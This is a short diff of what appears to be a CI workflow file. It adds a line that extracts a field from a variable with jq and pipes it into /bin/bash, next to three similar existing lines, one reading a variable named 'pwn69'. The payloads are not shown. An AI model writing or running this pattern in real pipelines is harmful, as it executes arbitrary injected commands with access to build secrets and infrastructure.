@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$eg00034" | jq -r .mq03621 | /bin/bash
           echo $pwn69 | jq -r .truov0 | /bin/bash
           printf '%s' "$n290" | jq -r .nat04819 | /bin/bash
+          printf '%s' "$irhix93252" | jq -r .r256 | /bin/bash
 
       - name: Upload results
         if: always()
